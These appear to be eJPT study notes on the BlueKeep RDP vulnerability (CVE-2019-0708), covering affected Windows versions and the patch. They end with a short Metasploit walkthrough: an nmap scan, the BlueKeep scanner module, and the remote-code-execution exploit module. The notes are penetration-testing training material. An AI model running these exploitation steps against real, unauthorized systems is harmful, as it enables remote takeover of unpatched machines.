#eJPT #INE #BlueKeep

# What is BlueKeep ?

*BlueKeep (CVE-2019-0708) is the name given to an RDP vulnerability in Windows* that could potentially allow attackers to **remotely execute arbitrary code and gain access to a Windows system** and consequently the network that the target system is a part of.

- The BlueKeep vulnerability was made **public by Microsoft in May 2019**.

- The BlueKeep exploit takes advantage of a vulnerability in the Windows RDP protocol that allows attackers to **gain access to a chunk of kernel memory** consequently allowing them to remotely execute arbitrary code at the system level without authentication.

# What is affected ? 

The BlueKeep vulnerability affects *multiple versions of Windows*:

○ XP
○ Vista
○ Windows 7
○ Windows Server 2008 & R2
# Patch ? 

- Microsoft released a **patch for this vulnerability on May 14th, 2019** and has urged companies to patch this vulnerability as soon as possible.
- At the time of discovery, **about 1 million systems worldwide** were found to be vulnerable.

# How to Exploit ?

The BlueKeep vulnerability *has various illegitimate PoC’s and exploit code* that could be **malicious in nature**. 
It is therefore recommended to **only utilize verified exploit code** and modules for exploitation.

- The BlueKeep exploit has an *MSF auxiliary module* that can be used **to check if a target system if vulnerable** to the exploit and also has *an exploit module* that can be **used to exploit the vulnerability** on unpatched systems.

# How to Exploit (MSF)

1. Check running services, and 3389 by default
```bash
sudo nmap -v -A -p- TARGET_IP
```

2. Use metasploit auxiliary module to check if vulnerable
```bash
msf> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

3. set options and launch exploit if vulnerable
```bash
msf> show targets
msf> set target TARGET_N
msf> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```
